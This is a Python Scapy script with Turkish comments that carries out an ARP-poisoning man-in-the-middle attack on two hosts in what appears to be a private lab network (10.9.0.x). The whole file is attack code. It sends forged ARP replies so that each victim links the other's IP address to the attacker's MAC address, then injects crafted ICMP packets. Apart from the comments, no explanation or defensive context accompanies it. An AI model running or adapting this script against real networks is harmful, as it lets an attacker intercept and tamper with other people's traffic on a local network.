#!/usr/bin/python3

from scapy.all import *

# ARP Zehirleme Saldırısı İçin Değişkenler
broadcast_mac = 'FF:FF:FF:FF:FF:FF'

A_mac = '02:42:0a:09:00:05'
A_ip = '10.9.0.5'

B_mac = '02:42:0a:09:00:06'
B_ip = '10.9.0.6'

M_mac = '02:42:0a:09:00:69'
M_ip = '10.9.0.105'

# ICMP Paketi Oluşturma
def create_icmp_packet(src_mac, dst_mac, src_ip, dst_ip):
    eth = Ether(src=src_mac, dst=dst_mac)
    ip = IP(src=src_ip, dst=dst_ip)
    icmp = ICMP()

    packet = eth/ip/icmp
    return packet

# ARP Zehirleme Saldırısı Gerçekleştirme
def perform_arp_spoofing(target_mac, target_ip, spoofed_mac, spoofed_ip):
    E = Ether(src=spoofed_mac, dst=target_mac)
    A = ARP(hwsrc=spoofed_mac, psrc=spoofed_ip, pdst=target_ip)

    sendp(E/A)

# Aradaki Adam Saldırısı
def perform_mitm_attack():
    # ARP Zehirleme Saldırısı - Düğüm A
    perform_arp_spoofing(A_mac, A_ip, M_mac, B_ip)

    # ARP Zehirleme Saldırısı - Düğüm B
    perform_arp_spoofing(B_mac, B_ip, M_mac, A_ip)

    # ICMP Paketi - Düğüm A'dan Düğüm B'ye
    icmp_packet_a_to_b = create_icmp_packet(A_mac, M_mac, A_ip, B_ip)
    sendp(icmp_packet_a_to_b)

    # ICMP Paketi - Düğüm B'den Düğüm A'ya
    icmp_packet_b_to_a = create_icmp_packet(B_mac, M_mac, B_ip, A_ip)
    sendp(icmp_packet_b_to_a)

# Aradaki Adam Saldırısını Gerçekleştirme
perform_mitm_attack()
